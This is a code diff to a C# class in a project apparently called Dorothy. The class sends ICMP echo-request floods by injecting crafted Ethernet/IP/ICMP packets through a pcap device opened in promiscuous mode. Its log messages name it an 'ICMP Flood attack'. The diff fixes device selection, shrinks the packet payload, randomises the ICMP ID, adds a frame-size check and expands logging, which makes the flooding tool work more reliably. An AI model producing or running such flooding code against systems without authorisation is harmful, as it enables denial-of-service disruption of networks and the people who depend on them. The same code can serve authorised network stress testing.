@@ -44,7 +44,9 @@ namespace Dorothy.Models
             {
                 _device = CaptureDeviceList.Instance
                     .OfType<LibPcapLiveDevice>()
-                    .FirstOrDefault(d => d.Addresses.Any(addr => addr.Addr.ipAddress != null && addr.Addr.ipAddress.ToString() == _sourceIp));
+                    .FirstOrDefault(d => d.Addresses.Any(addr => 
+                        addr.Addr?.ipAddress != null && 
+                        addr.Addr.ipAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork));
 
                 if (_device == null)
                 {
@@ -52,7 +54,7 @@ namespace Dorothy.Models
                     throw new Exception("No device found with the specified source IP.");
                 }
 
-                _device.Open(DeviceModes.Promiscuous, 1000);
+                _device.Open(DeviceModes.Promiscuous | DeviceModes.NoCaptureLocal, 1000);
 
                 if (_device is not IInjectionDevice injectionDevice)
                 {
@@ -75,13 +77,21 @@ namespace Dorothy.Models
 
                 var icmpData = new byte[1400]; // Increased payload size
                 new Random().NextBytes(icmpData); // Random payload
-                var icmpPacket = new IcmpV4Packet(new PacketDotNet.Utils.ByteArraySegment(icmpData))
+                var icmpPacket = new IcmpV4Packet(new PacketDotNet.Utils.ByteArraySegment(new byte[8]))
                 {
-                    TypeCode = IcmpV4TypeCode.EchoRequest
+                    TypeCode = IcmpV4TypeCode.EchoRequest,
+                    Id = (ushort)new Random().Next(0, ushort.MaxValue),
+                    Sequence = 0
                 };
 
                 ipPacket.PayloadPacket = icmpPacket;
                 ethernetPacket.PayloadPacket = ipPacket;
+
+                if (ethernetPacket.Bytes.Length < 14) // Minimum Ethernet frame size
+                {
+                    Logger.Error("Invalid packet size");
+                    return;
+                }
 
                 double packetSize = ethernetPacket.Bytes.Length;
                 int packetsPerSecond = (int)Math.Ceiling(_bytesPerSecond / packetSize);
@@ -115,7 +125,7 @@ namespace Dorothy.Models
                         }
                         catch (Exception ex)
                         {
-                            Logger.Error(ex, "Failed to send ICMP packet.");
+                            Logger.Error(ex, $"Failed to send ICMP packet. Device: {_device?.Name}, Source: {_sourceIp}, Target: {_targetIp}");
                         }
                     }
                     return Task.CompletedTask;
@@ -135,6 +145,9 @@ namespace Dorothy.Models
                 _device?.Close();
                 Logger.Info("ICMP Flood attack stopped.");
             }
+
+            Logger.Info($"Selected device: {_device?.Name}, IP: {_device?.Addresses.FirstOrDefault()?.Addr?.ipAddress}");
+            Logger.Info($"Source MAC: {BitConverter.ToString(_sourceMac.GetAddressBytes())}, Target MAC: {BitConverter.ToString(_targetMac)}");
         }
 
         public void Dispose()
